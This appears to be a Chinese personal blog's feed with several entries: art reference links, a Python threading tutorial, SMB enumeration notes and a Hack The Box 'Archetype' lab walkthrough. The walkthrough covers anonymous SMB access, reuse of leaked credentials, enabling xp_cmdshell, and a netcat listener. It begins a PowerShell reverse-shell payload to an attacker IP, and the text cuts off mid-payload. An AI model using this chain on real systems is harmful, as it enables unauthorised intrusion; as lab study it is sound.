      <url>/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<p>brusheezy（免费笔刷网站）<a href="http://www.brusheezy.com/">www.brusheezy.com</a><br>itsnicethat (插画师创作分享网站)  <a href="http://www.itsnicethat.com/">www.itsnicethat.com</a><br>xuehuahua (基础教程) <a href="http://www.xuehuahua.cc/">www.xuehuahua.cc</a></p><p>mixkit (优秀插画作品参考) <a href="https://mixkit.co/free-stock-art">https://mixkit.co/free-stock-art</a><br>皮克斯 （摄影作品参考） <a href="http://www.pexels.com/">www.pexels.com</a><br>500px  （无版权照片素材网）<a href="https://500px.com.cn/">https://500px.com.cn</a></p><p>pixivic  （p站镜像站小粉红） <a href="http://www.pixivic.com/">www.pixivic.com</a><br>GGAC  （国内权威的 CG网站）<a href="http://www.ggac.com/v2/home">www.ggac.com/v2/home</a><br>cgsociety （美国权威的 CG网站）<a href="http://www.cgsociety.org/">www.cgsociety.org</a></p><p>花瓣 站酷 微元素 堆糖 知妖直接搜索名字就好</p><p>Pinterest (最强联想素材搜索) <a href="https://www.pinterest.com/">https://www.pinterest.com/</a><br>sketchfab (3D模型参考) <a href="https://sketchfab.com/3d-models">https://sketchfab.com/3d-models</a><br>bodiesinmotion （人物动态与表情参考）<a href="https://www.bodiesinmotion.photo/">https://www.bodiesinmotion.photo</a><br>posemaniacs (360度观察人体肌肉) <a href="https://www.posemaniacs.com/zh-Hans">https://www.posemaniacs.com/zh-Hans</a><br>getbodysmart  （人体骨骼肌肉神经系统）<a href="http://www.getbodysmart.com/">www.getbodysmart.com</a><br>quickposes (姿势速写练习) <a href="https://quickposes.com/en">https://quickposes.com/en</a><br>line-of-action  (人物 动物速写练习)   <a href="https://line-of-action.com/">https://line-of-action.com</a><br>x6ud (通过摆动骨骼搜索对应动作图片) <a href="https://x6ud.github.io/female-anatomy-for-artist-search-helper/#/">https://x6ud.github.io/female-anatomy-for-artist-search-helper/#/</a></p><p>chojugiga （动物拟人参考）<a href="http://www.chojugiga.com/">www.chojugiga.com</a><br>pixelsquid （各种物体画法参考）<a href="http://www.pixelsquid.com/png">www.pixelsquid.com/png</a><br>microsculpture  （各种昆虫图片）<a href="http://www.microsculpture.net/">www.microsculpture.net</a><br>withawish  （燕尾服参考网站）<a href="http://www.withawish.jp/">www.withawish.jp</a><br>uenoya （霸道总裁长外套） <a href="https://long-coat.uenoya.jp/">https://long-coat.uenoya.jp</a></p><p>musinsa  （练习速写和褶皱）<a href="https://m.store.musinsa.com/app/styles/lists">https://m.store.musinsa.com/app/styles/lists</a><br>|screenmusings （电影图的参考网站）<a href="http://www.screenmusings.org/">www.screenmusings.org</a><br>Filmgrab  （全世界的电影截图）<a href="https://film-grab.com/">https://Film-grab.com</a><br>impawards （电影海报素材）<a href="http://www.impawards.com/">http://www.impawards.com/</a></p><p>nipponcolors （日本配色网站） <a href="https://nipponcolors.com/">https://nipponcolors.com/</a><br>coolors  （新手配色网站） <a href="https://coolors.co/">https://coolors.co/</a><br>Yorke Antique Textiles（纹理图案网站） <a href="https://www.yorkeantiquetextiles.com/">https://www.yorkeantiquetextiles.com/</a><br>loftcn (房屋设计网站)  <a href="https://loftcn.com/">https://loftcn.com/</a></p><p>Petalica paint (自动线稿上色服务) <a href="https://petalica-paint.pixiv.dev/index_zh.html">https://petalica-paint.pixiv.dev/index_zh.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 进程与线程</title>
      <link href="/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>使用多进程和多线程最好的方式是使用<code>Master-Worker</code>的设计模式</p><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><strong>多进程</strong>不共享内存空间，所以变量将会拷贝一份副本到新的进程中。</p><p>进程可以在不同的CPU核心上切换，Unix使用的底层的<code>fork()</code>函数，而windows支持的并不好，所以只能最大限度模拟。</p><p>通用的封装模块有两个。<code>subprocess</code>和<code>multiprocessing</code></p><p>调用外部程序使用的是<code>subprocess</code>，而创建新的进程往往使用的是<code>multiprocessing</code></p><h3 id="调用外部程序"><a href="#调用外部程序" class="headerlink" title="调用外部程序"></a>调用外部程序</h3><p>当调用的外部程序不需要复杂交互的时候，可以使用<code>call</code>方法直接创建子进程，然后得到返回。<br><code>call</code>方法是拥塞的，将会等到子进程结束才会继续执行父进程。</p><p>当调用的外部程序有复杂交互的时候，可以使用<code>Popen</code>方法。<br><code>Popen</code>方法是非拥塞的。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">r = subprocess.call([<span class="hljs-string">&#x27;nslookup&#x27;</span>, <span class="hljs-string">&#x27;python.org&#x27;</span>])</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exit code:&#x27;</span>, r)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">p = subprocess.Popen([<span class="hljs-string">&#x27;nslookup&#x27;</span>], stdin=subprocess.PIPE,</span><span class="line">                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><span class="line"></br></span><span class="line">output, error = p.communicate(<span class="hljs-string">b&#x27;setq=mx\npython.org\nexit\n&#x27;</span>)</span><span class="line"><span class="hljs-built_in">print</span>(output.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return Code:&#x27;</span>, p.returncode)</span></code></pre></div></div><h3 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h3><p>创建子进程也有两种方式，一种是用<code>multiprocessing.Process</code>进行单次创建，另一种就是使用<code>multiprocessing.Pool</code>创建一个池，然后管理池中子进程.</p><h4 id="multiprocessing-Process"><a href="#multiprocessing-Process" class="headerlink" title="multiprocessing.Process"></a>multiprocessing.Process</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_child</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    sleep(<span class="hljs-number">1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run child name %s, pid is %s&#x27;</span> % (name, os.getpid()))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())</span><span class="line marked">    p = Process(target=run_child, args=(<span class="hljs-string">&#x27;test&#x27;</span>,))</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start child process&#x27;</span>)</span><span class="line">    p.start()  <span class="hljs-comment"># 会自动调用run_child函数</span></span><span class="line">    p.join()  <span class="hljs-comment"># 会等待子进程结束后再继续往下运行</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process end&#x27;</span>)</span></code></pre></div></div><h4 id="multiprocessing-Pool"><a href="#multiprocessing-Pool" class="headerlink" title="multiprocessing.Pool"></a>multiprocessing.Pool</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool, cpu_count</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">long_time_wait</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Run task %s, pid is %s&quot;</span> % (name, os.getpid()))</span><span class="line">    start_time = time.time()</span><span class="line">    time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line">    end_time = time.time()</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Task %s runs %0.2f sec&quot;</span> % (name, (end_time - start_time)))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Parent pid is %s&quot;</span> % os.getpid())</span><span class="line marked">    p = Pool(cpu_count())  <span class="hljs-comment"># 这个是进程池，默认是CPU核数，可以自己指定</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;subprocess Start&quot;</span>)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):</span><span class="line marked">        p.apply_async(long_time_wait, args=(i,))  <span class="hljs-comment"># 这个是异步的，异步的执行，不会阻塞当前的进程</span></span><span class="line">        <span class="hljs-comment"># p.apply(long_time_wait, args=(1,))  # 这个是同步的，同步的执行，会阻塞当前的进程</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before close&#x27;</span>)</span><span class="line">    p.close() <span class="hljs-comment"># 在join()之前必须close()</span></span><span class="line">    p.join()</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All subprocess done&quot;</span>)</span></code></pre></div></div><h3 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h3><p>进程间的通讯使用的是<code>multiprocessing.Queue</code>队列</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]:</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Put %s in queue&#x27;</span> % value)</span><span class="line marked">        q.put(value)</span><span class="line">        time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line marked">        value = q.get(<span class="hljs-literal">True</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Get %s from queue&#x27;</span> % value)</span><span class="line">        time.sleep(<span class="hljs-number">0.1</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    q = Queue()</span><span class="line">    pw = Process(target=write, args=(q,))</span><span class="line">    pr = Process(target=read, args=(q,))</span><span class="line">    pw.start()</span><span class="line">    pr.start()</span><span class="line">    pw.join()</span><span class="line">    pr.terminate() <span class="hljs-comment"># 由于read是死循环，需要强制结束</span></span></code></pre></div></div><p><code>Process</code>中有<code>terminate</code>方法强制结束，但是线程中没有。</p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p><strong>多线程</strong>共享一个内存空间，调用的变量也是同一个。</p><p>多线程python支持的不错，但是以下几点必须注意：</p><ol><li>在读写全局变量的时候必须加入线程锁，并且确保释放</li><li>多线程的变量<strong>传参</strong>使用<code>threading.Local</code>对象</li><li>python的多线程只能利用一核，要使用多核就必须要用到多进程了</li></ol><p>但是不得不说，多线程没有协程好用，并且效率没有协程高。<a href="/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/" title="python 异步IO">python 异步IO</a></p><h3 id="不带读写的多线程创建"><a href="#不带读写的多线程创建" class="headerlink" title="不带读写的多线程创建"></a>不带读写的多线程创建</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loop</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s&#x27;</span> % threading.current_thread().name)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s &gt;&gt;&gt; %s&#x27;</span> % (threading.current_thread().name, i))</span><span class="line">        time.sleep(random.random())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s Done&#x27;</span> % threading.current_thread().name)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread: &#x27;</span>, threading.current_thread().name)</span><span class="line marked">t = threading.Thread(target=loop, name=<span class="hljs-string">&#x27;LoopThread&#x27;</span>)</span><span class="line">t.start()</span><span class="line">t.join()</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread %s Done&#x27;</span> % threading.current_thread().name)</span></code></pre></div></div><h3 id="读写带进程锁的多线程创建"><a href="#读写带进程锁的多线程创建" class="headerlink" title="读写带进程锁的多线程创建"></a>读写带进程锁的多线程创建</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 假定这是你的银行存款:</span></span><span class="line">balance = <span class="hljs-number">0</span></span><span class="line marked">lock = threading.Lock()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_it</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-comment"># 先存后取，结果应该为0:</span></span><span class="line">    <span class="hljs-keyword">global</span> balance</span><span class="line">    balance = balance + n</span><span class="line">    balance = balance - n</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_thread</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000000</span>):</span><span class="line marked">        lock.acquire()</span><span class="line marked">        <span class="hljs-keyword">try</span>:</span><span class="line marked">            change_it(n)</span><span class="line marked">        <span class="hljs-keyword">finally</span>:</span><span class="line marked">            lock.release()</span><span class="line"></br></span><span class="line"></br></span><span class="line">t1 = threading.Thread(target=run_thread, args=(<span class="hljs-number">5</span>,))</span><span class="line">t2 = threading.Thread(target=run_thread, args=(<span class="hljs-number">8</span>,))</span><span class="line">t1.start()</span><span class="line">t2.start()</span><span class="line">t1.join()</span><span class="line">t2.join()</span><span class="line"><span class="hljs-built_in">print</span>(balance)</span></code></pre></div></div><h3 id="Local-传递变量"><a href="#Local-传递变量" class="headerlink" title="Local 传递变量"></a>Local 传递变量</h3><p>使用local其实是省略了<code>dict[threading.current_thread()]</code>，来保证取到的变量是本线程的变量</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"></br></span><span class="line">local_s = threading.local()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_thread</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    local_s.name = name</span><span class="line">    proc_name()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proc_name</span>():</span></span><span class="line">    name = local_s.name</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s, thread: %s&quot;</span> % (name, threading.current_thread().name))</span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p1&quot;</span>,), name=<span class="hljs-string">&quot;Thread_1&quot;</span>)</span><span class="line">p2 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p2&quot;</span>,), name=<span class="hljs-string">&quot;Thread_2&quot;</span>)</span><span class="line">p1.start()</span><span class="line">p2.start()</span><span class="line">p1.join()</span><span class="line">p2.join()</span></code></pre></div></div><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>使用<code>multiprocessing.pool.ThreadPool</code>创建线程池</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing.pool <span class="hljs-keyword">import</span> ThreadPool</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>(<span class="hljs-params">bar, baz</span>):</span></span><span class="line">  <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;hello &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(bar)</span><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;foo&#x27;</span> + baz</span><span class="line"></br></span><span class="line">pool = ThreadPool(processes=<span class="hljs-number">1</span>)</span><span class="line"></br></span><span class="line">async_result = pool.apply_async(foo, (<span class="hljs-string">&#x27;elin&#x27;</span>, <span class="hljs-string">&#x27;foo&#x27;</span>,))</span><span class="line"></br></span><span class="line">result = async_result.get() <span class="hljs-comment"># 取返回值</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>smb</title>
      <link href="/2021/07/27/smb/"/>
      <url>/2021/07/27/smb/</url>
      
        <content type="html"><![CDATA[<p>SMB(Server Message Block) 是被设计通过LAN来远程读写文件的协议。是微软的主要通讯协议。</p><p>SMB使用了NetBIOS接口，所以为什么smb通常是139，445两个端口?</p><h2 id="Port-139"><a href="#Port-139" class="headerlink" title="Port 139"></a>Port 139</h2><p>端口139是 NBT over IP。</p><p>NetBIOS(Network Basic Input Output System) 可以使软件、PC等设备通过LAN网络进行通讯。</p><p>在NetBIOS网络上运行的软件通过NetBIOS名称进行互相识别。NetBIOS名称长度为16个字符，与计算机名称分开。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-arduino codeBlockLines"><span class="line"><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></code></pre></div></div><h2 id="Port-445"><a href="#Port-445" class="headerlink" title="Port 445"></a>Port 445</h2><p>445端口是 SMB over IP， 现在也称为CIFS(Common Internet File System)。运行在应用层，用于提供访问文件、打印机、串口以及其他基于网络的两端节点通讯。</p><p>在Windows中，SMB直接基于TCP/IP运行，不需要NetBIOS,所以一般只有445。<br>而其他操作系统就会有139端口一起，这说明SMB的运行是基于BetBIOS的TCP/IP的。</p><h3 id="IPC"><a href="#IPC" class="headerlink" title="$IPC"></a>$IPC</h3><p>当使用匿名用户或者空用户的时候，可以访问<code>IPC$</code>。使用<a href="#">Post not found: enum4linux-工具使用</a>从这里可以获取：</p><ol><li>操作系统信息</li><li>域的详细信息</li><li>本地用户和组的列表</li><li>可用SMB共享的详细信息</li><li>生效的系统安全策略</li></ol><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="对网段中的主机搜索SMB服务"><a href="#对网段中的主机搜索SMB服务" class="headerlink" title="对网段中的主机搜索SMB服务"></a>对网段中的主机搜索SMB服务</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nbtscan -r 192.168.0.1/24</span></code></pre></div></div><h3 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; use  auxiliary/scanner/smb/smb_version  </span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/sh</span></span><span class="line"><span class="hljs-comment">#Author: rewardone</span></span><span class="line"><span class="hljs-comment">#Description:</span></span><span class="line"><span class="hljs-comment"># Requires root or enough permissions to use tcpdump</span></span><span class="line"><span class="hljs-comment"># Will listen for the first 7 packets of a null login</span></span><span class="line"><span class="hljs-comment"># and grab the SMB Version</span></span><span class="line"><span class="hljs-comment">#Notes:</span></span><span class="line"><span class="hljs-comment"># Will sometimes not capture or will print multiple</span></span><span class="line"><span class="hljs-comment"># lines. May need to run a second time for success.</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: ./smbver.sh RHOST &#123;RPORT&#125;&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span>; <span class="hljs-keyword">else</span> rhost=<span class="hljs-variable">$1</span>; <span class="hljs-keyword">fi</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! -z <span class="hljs-variable">$2</span> ]; <span class="hljs-keyword">then</span> rport=<span class="hljs-variable">$2</span>; <span class="hljs-keyword">else</span> rport=139; <span class="hljs-keyword">fi</span></span><span class="line">tcpdump -s0 -n -i tap0 src <span class="hljs-variable">$rhost</span> and port <span class="hljs-variable">$rport</span> -A -c 7 2&gt;/dev/null | grep -i <span class="hljs-string">&quot;samba\|s.a.m&quot;</span> | tr -d <span class="hljs-string">&#x27;.&#x27;</span> | grep -oP <span class="hljs-string">&#x27;UnixSamba.*[0-9a-z]&#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &amp; <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$rhost</span>: &quot;</span> &amp;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;exit&quot;</span> | smbclient -L <span class="hljs-variable">$rhost</span> 1&gt;/dev/null 2&gt;/dev/null</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &amp;&amp; sleep .1</span></code></pre></div></div><h3 id="搜索对应版本的exploit"><a href="#搜索对应版本的exploit" class="headerlink" title="搜索对应版本的exploit"></a>搜索对应版本的exploit</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; search <span class="hljs-built_in">type</span>:exploit platform:windows target:2008 smb</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">searchsploit microsoft smb</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>smb 渗透清单</title>
      <link href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p><a href="/2021/07/27/smb/" title="smb">smb</a></p><p>命令已集成到<a href="https://github.com/Elinpf/cmder">cmder</a></p><p>smb的信息收集</p><ul><li><input disabled="" type="checkbox"> 搜索网络中的SMB服务</li><li><input disabled="" type="checkbox"> 版本信息</li><li><input disabled="" type="checkbox"> 针对版本的exploit信息</li></ul><p>没有用户名和密码的情况下</p><ul><li><input disabled="" type="checkbox"> 使用空账号和密码</li><li><input disabled="" type="checkbox"> 使用匿名账号</li><li><input disabled="" type="checkbox"> 使用常用密码快速进行暴力破解</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB start point 1 - Archetype</title>
      <link href="/2021/07/27/HTB-start-point-1-archetype/"/>
      <url>/2021/07/27/HTB-start-point-1-archetype/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea">参考</a>解读官方文档</li><li><a href="http://imin.red/2020-04-15-0x01-startingpoint-archetype/">这篇文章</a>详细讲述了思考过程</li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">这篇文章</a>介绍了关于smb的渗透技巧，包括使用msf</li><li><a href="https://www.hackingarticles.in/mssql-penetration-testing-metasploit/">MSSQL Penetration Testing with Metasploit</a></li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">SMB Penetration Testing (Port 445)</a></li></ul><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>侦察阶段，根据<a href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/" title="Linux 侦察清单">Linux 侦察清单</a>，收集开启的端口</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)</span><span class="line"></br></span><span class="line">nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.27 </span></code></pre></div></div><p>通过扫描可以发现<code>445</code>端口是开启的，服务是SQL Server。</p><p>根据<a href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="smb 渗透清单">smb 渗透清单</a></p><p>可能的漏洞为匿名用户登录</p><p>使用 <code>smbclient -L 10.10.10.27</code>发现</p><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611823952726.png"></p><p>其中有backups可能是突破点，使用 <code>smbclient //10.10.10.27/backups</code>进入smb共享文件，然后发现在目录下有<code>.dtsConfig</code>的文件。</p><blockquote><p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p></blockquote><p>也就是SQLServer的配置文件。</p><p>使用<code>get &lt;filename&gt;</code>命令将文件拷贝到本地后打开发现，<br><img src="/2021/07/27/HTB-start-point-1-archetype/1611824416119.png"></p><p>这个也就是数据库的用户。但是要考虑的是，这个用户可能是没有高级权限的。</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>要登录数据库，使用的是<a href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket">impackets</a>工具箱中的<code>mssqlclient.py</code> 工具。</p><p><code>mssqlclint.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><ul><li>注意是<code>/</code></li><li>windows的验证 <code>-windows-auth</code></li></ul><p>当进入mssql之后，要确定权限。</p><ul><li><code>select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></li></ul><p>确定权限后打开<code>xp_cmdshell</code>运行权限。 在mssqlclient.py中可以直接使用<code>enable_xp_cmdshell</code>一键开启</p><p>然后通过方向连接获得shell。</p><p>手册给出的手动解法是写一个getshell的文件，然后让目标机下载并执行。</p><p>所以这里就有4个点：</p><ol><li>要让目标机下载攻击机中的文件，需要在攻击机上开启下载端口，这里给出的方法是使用http的方式下载。<ul><li><code>python -m http.server 1633</code></li></ul></li><li>目标机下载执行后需要与攻击机建立shell连接，所以需要另外一个监听端口。<ul><li><code>nc -nvlp 5711</code></li></ul></li><li>攻击机上<code>shell.ps1</code>这个文件怎么写</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-variable">$client</span> = <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.32&quot;</span>,<span class="hljs-number">5711</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-number">.65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span 